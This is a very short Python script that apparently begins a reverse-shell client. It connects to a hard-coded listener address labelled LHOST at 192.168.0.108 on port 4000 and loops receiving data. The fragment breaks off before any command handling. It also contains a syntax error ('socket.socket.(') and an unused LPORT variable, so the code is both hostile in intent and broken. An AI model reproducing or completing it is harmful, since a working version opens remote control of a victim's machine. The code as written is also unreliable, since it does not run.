import socket

LHOST = '192.168.0.108'
LPORT = 4000


s = socket.socket.(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LHOST, 4000))


while  True:
	data = s.recv(1024)